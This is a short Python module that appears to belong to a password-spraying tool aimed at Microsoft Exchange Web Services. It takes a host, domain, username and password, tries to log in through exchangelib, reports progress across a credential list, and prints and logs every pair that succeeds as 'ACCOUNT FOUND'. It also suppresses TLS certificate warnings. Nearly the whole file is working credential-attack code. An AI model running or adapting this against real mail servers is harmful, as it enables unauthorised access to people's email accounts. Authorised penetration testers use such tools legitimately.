#!/usr/bin/env python3

import warnings
from exchangelib import Account
from exchangelib import Configuration
from exchangelib import Credentials
from exchangelib import DELEGATE
from exchangelib.errors import CASError
from exchangelib.errors import UnauthorizedError
# This is to suppress the insecure warning. If there is a better way please let me know
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

def ews_conn(params):

    username = params.get("username")
    password = params.get("password")
    count = params.get("count")
    place = params.get("place")
    filelogger = params.get("filelogger")
    domain = params.get("domain")
    owa = ''.join(params.get("host"))
    target = owa.split('/')

    try:
        # print the host , username and password being checked
        print("ACCOUNT CHECK: [EWS] Target: {} User: {} [{} of {}, {} completed] Password: {}".format(
            target[0], username, place, count, place, password))
        account, config = ews_config_setup(username, password, domain, owa)

        if account is not None and config is not None:
            print(f"ACCOUNT FOUND: [EWS] Target: {target[0]} User: {username} Password: {password} [SUCCESS]")
            if filelogger != None:
                filelogger.debug(f"ACCOUNT FOUND: [EWS] Target: {target[0]} User: {username} Password: {password} [SUCCESS]")
        else:
            pass
	
    except:
        pass

def ews_config_setup(user, password, domain,serverurl):

    try:
        config = Configuration(
            server=serverurl,
            credentials=Credentials(
                username="{}@{}".format(user, domain),
                password=password))

        account = Account(
            primary_smtp_address="{}@{}".format(user, domain),
            autodiscover=False,
            config=config,
            access_type=DELEGATE)

    except UnauthorizedError:
        #print("Bad password")
        return None, None

    except CASError:
        #print("CAS Error: User {} does not exist.".format(user))
        return None, None

    return account, config
